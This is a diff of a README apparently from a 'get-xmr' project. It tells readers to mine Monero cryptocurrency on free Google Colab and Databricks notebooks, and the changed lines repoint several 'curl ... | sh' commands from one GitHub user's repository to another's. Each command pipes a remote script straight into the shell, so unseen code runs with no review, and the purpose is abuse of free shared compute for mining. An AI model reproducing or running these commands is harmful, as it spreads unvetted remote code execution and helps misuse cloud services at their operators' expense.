@@ -8,15 +8,15 @@ curl https://raw.githubusercontent.com/a2nk/get-xmr/main/databricks.sh | sh
 * Try Free [XRDP GColab](https://colab.research.google.com/drive/1b1qhBUk4nXU6oriQv6VdcpKhSZqxlomc?usp=sharing)
 ```markdown
 screen -R xmr
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-sg.sh | sh
+curl https://raw.githubusercontent.com/juliversamuel/GC/main/gcolab-sg.sh | sh
 ```
 ```markdown
 screen -R xmr
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-us.sh | sh
+curl https://raw.githubusercontent.com/juliversamuel/GC/main/gcolab-us.sh | sh
 ```
 ```markdown
 screen -R xmr
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/nvidiacolab-us.sh | sh
+curl https://raw.githubusercontent.com/juliversamuel/GC/main/nvidiacolab-us.sh | sh
 ```
 * Try Free [40 CPU GColab to get XMR](https://colab.research.google.com/github/a2nk/get-xmr/blob/main/40CPU_getXMR.ipynb)
  
